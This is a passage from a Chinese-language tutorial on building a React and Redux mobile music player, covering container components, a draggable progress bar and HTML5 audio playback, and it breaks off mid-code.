href=\"https://juejin.im/post/5a40aea26fb9a044fd12005e\"\u003e上一节\u003c/a\u003e开发好的Album组件连接到Redux，为了区分容器组件和ui组件，我们把需要连接redux的容器组件放置到一个单独的目录中，只需引入ui组件即可。在src下新建\u003cstrong\u003econtainers\u003c/strong\u003e目录，然后新建\u003cstrong\u003eAlbum.js\u003c/strong\u003e对应ui组件Album\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAlbum.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport {connect} from \u003cspan class=\"hljs-string\"\u003e\"react-redux\"\u003c/span\u003e\nimport {showPlayer, changeSong, \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eSongs} from \u003cspan class=\"hljs-string\"\u003e\"../redux/actions\"\u003c/span\u003e\nimport Album from \u003cspan class=\"hljs-string\"\u003e\"../components/album/Album\"\u003c/span\u003e\n\n//映射dispatch到props上\nconst mapDispatchToProps = (dispatch) =\u0026gt; ({\n    showMusicPlayer: (status) =\u0026gt; {\n        dispatch(showPlayer(status));\n    },\n    changeCurrentSong: (song) =\u0026gt; {\n        dispatch(changeSong(song));\n    },\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eSongs: (songs) =\u0026gt; {\n        dispatch(\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eSongs(songs));\n    }\n});\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default connect(null, mapDispatchToProps)(Album)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上诉代码中connect第一个参数用来映射store到组件props上，第二个参数是映射dispatch到props上，然后把Album组件传入，这里不需要获取store的状态，传入null\u003c/p\u003e\n\u003cp\u003e回到components下的Album.js组件中，增加歌曲列表点击事件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 选择歌曲\n */\nselectSong(song) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (e) =\u0026gt; {\n        this.props.setSongs([song]);\n        this.props.changeCurrentSong(song);\n    };\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e songs = this.state.songs.map((song) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n        \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"song\"\u003c/span\u003e key={song.id} onClick={this.selectSong(song)}\u0026gt;\n            ...\n        \u0026lt;/div\u0026gt;\n    );\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上诉代码中的\u003cstrong\u003esetSongs\u003c/strong\u003e和\u003cstrong\u003echangeCurrentSong\u003c/strong\u003e都是通过mapDispatchToProps映射到组件的props上\u003c/p\u003e\n\u003cp\u003e在Recommend.js中将导入Album.js修改为containers下的Album.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//import Album from \u003cspan class=\"hljs-string\"\u003e\"../album/Album\"\u003c/span\u003e\nimport Album from \u003cspan class=\"hljs-string\"\u003e\"@/containers/Album\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了测试是否可以修改状态，先在components下面新建\u003cstrong\u003eplay\u003c/strong\u003e目录然后新建\u003cstrong\u003ePlayer.js\u003c/strong\u003e用来获取状态相关信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\n\nclass Player extends React.Component {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        console.log(this.props.currentSong);\n        console.log(this.props.playSongs);\n    }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Player\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在containers目录下新建对应的容器组件\u003cstrong\u003ePlayer.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport {connect} from \u003cspan class=\"hljs-string\"\u003e\"react-redux\"\u003c/span\u003e\nimport {showPlayer, changeSong} from \u003cspan class=\"hljs-string\"\u003e\"../redux/actions\"\u003c/span\u003e\nimport Player from \u003cspan class=\"hljs-string\"\u003e\"../components/play/Player\"\u003c/span\u003e\n\n//映射Redux全局的state到组件的props上\nconst mapStateToProps = (state) =\u0026gt; ({\n    showStatus: state.showStatus,\n    currentSong: state.song,\n    playSongs: state.songs\n});\n\n//映射dispatch到props上\nconst mapDispatchToProps = (dispatch) =\u0026gt; ({\n    showMusicPlayer: (status) =\u0026gt; {\n        dispatch(showPlayer(status));\n    },\n    changeCurrentSong: (song) =\u0026gt; {\n        dispatch(changeSong(song));\n    }\n});\n\n//将ui组件包装成容器组件\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default connect(mapStateToProps, mapDispatchToProps)(Player)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003emapStateToProps函数将store的状态映射到组件的props上，Player组件会订阅store，当store的状态发生修改时会调用render方法触发更新\u003c/p\u003e\n\u003cp\u003e在App.js中引入容器组件Player\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Player from \u003cspan class=\"hljs-string\"\u003e\"../containers/Player\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e放到如下位置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Router\u0026gt;\n  \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n    ...\n     \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-view\"\u003c/span\u003e\u0026gt;\n        ...\n    \u0026lt;/div\u0026gt;\n    \u0026lt;Player/\u0026gt;\n  \u0026lt;/div\u0026gt;\n\u0026lt;/Router\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e启动应用后打开控制台，查看状态\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b24a17da17d7c?w=774\u0026amp;h=45\u0026amp;f=png\u0026amp;s=3812\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n在专辑页点击歌曲后查看状态\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b24b6c0387039?w=785\u0026amp;h=261\u0026amp;f=png\u0026amp;s=45294\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e封装Progress组件\u003c/h3\u003e\n\u003cp\u003e这个项目中会有两个地方用到歌曲播放进度展示，一个是播放组件，另一个就是mini播放组件。我们把进度条功能抽取出来，根据业务需要传递props\u003c/p\u003e\n\u003cp\u003e在components下的play目录新建\u003cstrong\u003eProgress.js\u003c/strong\u003e和\u003cstrong\u003eprogress.styl\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eProgress.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\n\nimport \u003cspan class=\"hljs-string\"\u003e\"./progress.styl\"\u003c/span\u003e\n\nclass Progress extends React.Component {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidUpdate\u003c/span\u003e\u003c/span\u003e() {\n\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidMount\u003c/span\u003e\u003c/span\u003e() {\n\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-bar\"\u003c/span\u003e\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress\"\u003c/span\u003e style={{width:\u003cspan class=\"hljs-string\"\u003e\"20%\"\u003c/span\u003e}}\u0026gt;\u0026lt;/div\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-button\"\u003c/span\u003e style={{left:\u003cspan class=\"hljs-string\"\u003e\"70px\"\u003c/span\u003e}}\u0026gt;\u0026lt;/div\u0026gt;\n            \u0026lt;/div\u0026gt;\n        );\n    }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Progress\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003eprogress.styl请查看源代码，结尾有源码地址\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b58508511392e?w=366\u0026amp;h=16\u0026amp;f=png\u0026amp;s=392\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eProgress组件接收进度（\u003cstrong\u003eprogress\u003c/strong\u003e），是否禁用按钮（\u003cstrong\u003edisableButton\u003c/strong\u003e），是否禁用拖拽（\u003cstrong\u003edisableButton\u003c/strong\u003e），开始拖拽回调函数（\u003cstrong\u003eonDragStart\u003c/strong\u003e），拖拽中回调函数（\u003cstrong\u003eonDrag\u003c/strong\u003e）和拖拽接受回调函数（\u003cstrong\u003eonDragEnd\u003c/strong\u003e）等属性\u003c/p\u003e\n\u003cp\u003e接下来给Progress组件加上进度和拖拽功能\u003c/p\u003e\n\u003cp\u003e使用\u003cstrong\u003eprop-types\u003c/strong\u003e给传入的props进行类型校验，导入prop-types\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport PropTypes from \u003cspan class=\"hljs-string\"\u003e\"prop-types\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eProgress.propTypes = {\n    progress: PropTypes.number.isRequired,\n    \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton: PropTypes.bool,\n    \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eDrag: PropTypes.bool,\n    onDragStart: PropTypes.func,\n    onDrag: PropTypes.func,\n    onDragEnd: PropTypes.func\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e注意：prop-types已经在前几节安装了\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e给元素加上ref\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-bar\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"progressBar\"\u003c/span\u003e\u0026gt;\n    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress\"\u003c/span\u003e style={{width:\u003cspan class=\"hljs-string\"\u003e\"20%\"\u003c/span\u003e}} ref=\u003cspan class=\"hljs-string\"\u003e\"progress\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-button\"\u003c/span\u003e style={{left:\u003cspan class=\"hljs-string\"\u003e\"70px\"\u003c/span\u003e}} ref=\u003cspan class=\"hljs-string\"\u003e\"progressBtn\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e导入react-dom，在componentDidMount中获取dom和进度条总长度\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e progressBarDOM = ReactDOM.findDOMNode(this.refs.progressBar);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e progressDOM = ReactDOM.findDOMNode(this.refs.progress);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e progressBtnDOM = ReactDOM.findDOMNode(this.refs.progressBtn);\nthis.progressBarWidth = progressBarDOM.offsetWidth;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在render方法中获取props，替换写死的style中的值。代码修改如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//进度值：范围 0-1\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {progress, \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton}  = this.props;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!progress) progress = 0;\n\n//按钮left值\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e progressButtonOffsetLeft = 0;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(this.progressBarWidth){\n\u0009progressButtonOffsetLeft = progress * this.progressBarWidth;\n}\n\n\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-bar\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"progressBar\"\u003c/span\u003e\u0026gt;\n\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-load\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress\"\u003c/span\u003e style={{width:`\u003cspan class=\"hljs-variable\"\u003e${progress * 100}\u003c/span\u003e%`}} ref=\u003cspan class=\"hljs-string\"\u003e\"progress\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0009{\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e : \n\u0009\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-button\"\u003c/span\u003e style={{left:progressButtonOffsetLeft}} ref=\u003cspan class=\"hljs-string\"\u003e\"progressBtn\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0009}\n\u0009\u0026lt;/div\u0026gt;\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上诉代码中\u003cstrong\u003eprogress\u003c/strong\u003e用来控制当前走过的进度值，\u003cstrong\u003eprogressButtonOffsetLeft\u003c/strong\u003e用来控制按钮距离进度条开始的位置。当disableButton为true时渲染一个空字符串，不为true则渲染按钮元素\u003c/p\u003e\n\u003cp\u003e拖拽功能利用移动端的touchstart、touchmove和touchend来实现。在componentDidMount中增加以下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton, \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eDrag, onDragStart, onDrag, onDragEnd} = this.props;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton !== \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eDrag !== \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n\u0009//触摸开始位置\n\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e downX = 0;\n\u0009//按钮left值\n\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e buttonLeft = 0;\n\n\u0009progressBtnDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"touchstart\"\u003c/span\u003e, (e) =\u0026gt; {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e touch = e.touches[0];\n\u0009\u0009downX = touch.clientX;\n\u0009\u0009buttonLeft = parseInt(touch.target.style.left, 10);\n\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (onDragStart) {\n\u0009\u0009    onDragStart();\n\u0009\u0009}\n\u0009});\n\u0009progressBtnDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"touchmove\"\u003c/span\u003e, (e) =\u0026gt; {\n\u0009\u0009e.preventDefault();\n\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e touch = e.touches[0];\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e diffX = touch.clientX - downX;\n\u0009\u0009\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e btnLeft = buttonLeft + diffX;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (btnLeft \u0026gt; progressBarDOM.offsetWidth) {\n\u0009\u0009    btnLeft = progressBarDOM.offsetWidth;\n\u0009\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (btnLeft \u0026lt; 0) {\n\u0009\u0009    btnLeft = 0;\n\u0009\u0009}\n\u0009\u0009//设置按钮left值\n\u0009\u0009touch.target.style.left = btnLeft + \u003cspan class=\"hljs-string\"\u003e\"px\"\u003c/span\u003e;\n\u0009\u0009//设置进度width值\n\u0009\u0009progressDOM.style.width = btnLeft / this.progressBarWidth * 100 + \u003cspan class=\"hljs-string\"\u003e\"%\"\u003c/span\u003e;\n\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (onDrag) {\n\u0009\u0009    onDrag(btnLeft / this.progressBarWidth);\n\u0009\u0009}\n\u0009});\n\u0009progressBtnDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"touchend\"\u003c/span\u003e, (e) =\u0026gt; {\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (onDragEnd) {\n\u0009\u0009    onDragEnd();\n\u0009\u0009}\n\u0009});\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e先判断按钮和拖拽功能是否启用，然后给\u003cstrong\u003eprogressBtnDOM\u003c/strong\u003e添加touchstart、touchmove和touchend事件。拖拽开始记录触摸开始的位置\u003cstrong\u003edownX\u003c/strong\u003e和按钮的left值\u003cstrong\u003ebuttonLeft\u003c/strong\u003e，拖拽中计算拖拽的距离\u003cstrong\u003ediffx\u003c/strong\u003e，然后重新设置按钮left值为\u003cstrong\u003ebtnLeft\u003c/strong\u003e。btnLeft就是拖拽后距离进度条最左边开始的距离，除以总进度长就是当前进度比。这个值乘以100就是\u003cstrong\u003eprogressDOM\u003c/strong\u003e的width。在拖拽中调事件对象\u003cstrong\u003epreventDefault\u003c/strong\u003e函数阻止有些浏览器触摸移动时窗口会前进后退的默认行为。在每个事件的最后调用对应的回调事件，\u003cstrong\u003eonDrag\u003c/strong\u003e回调函数中传入当前进度值\u003c/p\u003e\n\u003cp\u003e最后在componentDidUpdate中加入以下代码，解决组件更新后不能正确获取总进度长\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//组件更新后重新获取进度条总宽度\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!this.progressBarWidth) {\n    this.progressBarWidth = ReactDOM.findDOMNode(this.refs.progressBar).offsetWidth;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e开发播放组件\u003c/h3\u003e\n\u003cp\u003e播放功能主要使用H5的\u003cstrong\u003eaudio\u003c/strong\u003e元素来实现，结合\u003cstrong\u003ecanplay\u003c/strong\u003e、\u003cstrong\u003etimeupdate\u003c/strong\u003e、\u003cstrong\u003eended\u003c/strong\u003e和\u003cstrong\u003eerror\u003c/strong\u003e事件。当音频可以播放的时候会触发canplay事件。在播放中会触发timeupdate事件，timeupdate事件中可以获取歌曲的当前播放事件和总时长，利用这两个来更新组件的播放状态。播放完成后会触发ended事件，在这个事件中根据播放模式进行歌曲切换\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e歌曲播放\u003c/h4\u003e\n\u003cp\u003e在components下的play目录中新建\u003cstrong\u003eplayer.styl\u003c/strong\u003e样式文件，Player.js在上面测试状态的时候已经建好了。Player组件中有切换歌曲播放模式、上一首、下一首、播放、暂停等功能。我们把当前播放时间\u003cstrong\u003ecurrentTime\u003c/strong\u003e，播放进度\u003cstrong\u003eplayProgress\u003c/strong\u003e，播放状态\u003cstrong\u003eplayStatus\u003c/strong\u003e和当前播放模式\u003cstrong\u003ecurrentPlayMode\u003c/strong\u003e交给播放组件的state管理，把当前播放歌曲\u003cstrong\u003ecurrentSong\u003c/strong\u003e， 当前播放歌曲的位置\u003cstrong\u003ecurrentIndex\u003c/strong\u003e交给自身\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ePlayer.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\nimport ReactDOM from \u003cspan class=\"hljs-string\"\u003e\"react-dom\"\u003c/span\u003e\nimport {Song} from \u003cspan class=\"hljs-string\"\u003e\"@/model/song\"\u003c/span\u003e\n\nimport \u003cspan class=\"hljs-string\"\u003e\"./player.styl\"\u003c/span\u003e\n\nclass Player extends React.Component {\n    constructor(props) {\n        super(props);\n\n        this.currentSong = new Song( 0, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, 0, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e);\n        this.currentIndex = 0;\n\n        //播放模式： list-列表 single-单曲 shuffle-随机\n        this.playModes = [\u003cspan class=\"hljs-string\"\u003e\"list\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"single\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"shuffle\"\u003c/span\u003e];\n\n        this.state = {\n            currentTime: 0,\n            playProgress: 0,\n            playStatus: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n            currentPlayMode: 0\n        }\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidMount\u003c/span\u003e\u003c/span\u003e() {\n        this.audioDOM = ReactDOM.findDOMNode(this.refs.audio);\n        this.singerImgDOM = ReactDOM.findDOMNode(this.refs.singerImg);\n        this.playerDOM = ReactDOM.findDOMNode(this.refs.player);\n        this.playerBgDOM = ReactDOM.findDOMNode(this.refs.playerBg);\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e song = this.currentSong;\n\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e playBg = song.img ? song.img : require(\u003cspan class=\"hljs-string\"\u003e\"@/assets/imgs/play_bg.jpg\"\u003c/span\u003e);\n\n        //播放按钮样式\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e playButtonClass = this.state.playStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e\"icon-pause\"\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"icon-play\"\u003c/span\u003e;\n\n        song.playStatus = this.state.playStatus;\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-container\"\u003c/span\u003e\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e\u0026gt;\n                    ...\n                    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"singer-middle\"\u003c/span\u003e\u0026gt;\n                        \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"singer-img\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"singerImg\"\u003c/span\u003e\u0026gt;\n                            \u0026lt;img src={playBg} alt={song.name} onLoad={\n                                (e) =\u0026gt; {\n                                    /*图片加载完成后设置背景，防止图片加载过慢导致没有背景*/\n                                    this.playerBgDOM.style.backgroundImage = `url(\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${playBg}\u003c/span\u003e\"\u003c/span\u003e)`;\n                                }\n                            }/\u0026gt;\n                        \u0026lt;/div\u0026gt;\n                    \u0026lt;/div\u0026gt;\n                    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"singer-bottom\"\u003c/span\u003e\u0026gt;\n                        ...\n                    \u0026lt;/div\u0026gt;\n                    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-bg\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"playerBg\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n                    \u0026lt;audio ref=\u003cspan class=\"hljs-string\"\u003e\"audio\"\u003c/span\u003e\u0026gt;\u0026lt;/audio\u0026gt;\n                \u0026lt;/div\u0026gt;\n            \u0026lt;/div\u0026gt;\n        );\n    }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Player\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上述省略部分代码，完整代码在源码中查看\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eplayer.styl代码省略\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e导入Progress组件，然后放到以下位置传入playProgress\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Progress from \u003cspan class=\"hljs-string\"\u003e\"./Progress\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-progress\"\u003c/span\u003e\u0026gt;\n    \u0026lt;Progress progress={this.state.playProgress}/\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在render方法开头增加以下代码，同时在componentDidMount给audio元素添加canplay和timeupdate事件。判断当前歌曲是否已切换，如果歌曲切换设置新的src，随后能够播放触发canplay事件播放音频。播放的时候更新进度状态和当前播放时间\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//从redux中获取当前播放歌曲\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.currentSong \u0026amp;\u0026amp; this.props.currentSong.url) {\n    //当前歌曲发发生变化\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.currentSong.id !== this.props.currentSong.id) {\n        this.currentSong = this.props.currentSong;\n        this.audioDOM.src = this.currentSong.url;\n        //加载资源，ios需要调用此方法\n        this.audioDOM.load();\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.audioDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"canplay\"\u003c/span\u003e, () =\u0026gt; {\n    this.audioDOM.play();\n    this.startImgRotate();\n\n    this.setState({\n        playStatus: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    });\n\n}, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n\nthis.audioDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"timeupdate\"\u003c/span\u003e, () =\u0026gt; {\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.playStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n\u0009    this.setState({\n\u0009        playProgress: this.audioDOM.currentTime / this.audioDOM.duration,\n\u0009        currentTime: this.audioDOM.currentTime\n\u0009    });\n\u0009}\n}, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eaudio在移动端未触摸屏幕第一次是无法自动播放的，在constructor构造函数内增加一个\u003cstrong\u003eisFirstPlay\u003c/strong\u003e属性，在组件更新后判断这个属性是否为true，如果为tru就开始播放，然后设置为false\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.isFirstPlay = \u003cspan 